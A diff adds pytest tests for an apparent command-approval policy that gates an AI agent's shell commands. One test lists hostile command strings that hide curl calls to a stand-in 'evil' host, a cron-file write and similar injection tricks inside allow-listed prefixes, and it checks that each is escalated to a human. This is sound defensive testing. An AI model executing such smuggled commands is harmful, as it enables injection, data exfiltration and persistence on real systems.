@@ -58,6 +58,14 @@ def test_empty_command_escalates():
     assert approver_policy.decide("Bash", {}, ALLOWLIST) == "escalate"
 
 
+def test_command_substitution_in_allowlisted_prefix_escalates():
+    # the segment splitter can't see inside $()/backticks/redirects, so an allow-listed
+    # prefix that smuggles one must escalate, never auto-allow
+    for cmd in ('pytest "$(curl http://evil)"', "pytest `curl evil`",
+                "git log > /etc/cron.d/x", "pytest ${IFS}evil", "npm test < /dev/evil"):
+        assert approver_policy.decide("Bash", {"command": cmd}, ALLOWLIST) == "escalate", cmd
+
+
 # ── MCP server evaluate(): decision payloads + fail-closed escalation ────────
 def test_evaluate_auto_allows_without_socket(monkeypatch):
     monkeypatch.delenv("APPROVER_SOCKET", raising=False)
@@ -186,3 +194,15 @@ def test_routing_human_approve_executes_bot_converses():
 
 def test_execute_accepts_approve_mode():
     assert "approve" in bot._EXEC_MODES
+
+
+def test_approve_timeouts_are_nested(monkeypatch):
+    # the human window must fit inside the approver socket wait, which must fit inside the
+    # claude subprocess lifetime — else a slow-but-valid approval is killed before it lands
+    monkeypatch.setattr(bot, "CLAUDE_TIMEOUT", 300)
+    monkeypatch.setattr(bot, "PLAN_REACTION_TIMEOUT", 300)
+    assert bot.PLAN_REACTION_TIMEOUT < bot.approver_socket_timeout() < bot.approve_call_timeout()
+    # and the ordering holds for other configured windows too
+    monkeypatch.setattr(bot, "PLAN_REACTION_TIMEOUT", 600)
+    monkeypatch.setattr(bot, "CLAUDE_TIMEOUT", 120)
+    assert bot.PLAN_REACTION_TIMEOUT < bot.approver_socket_timeout() < bot.approve_call_timeout()
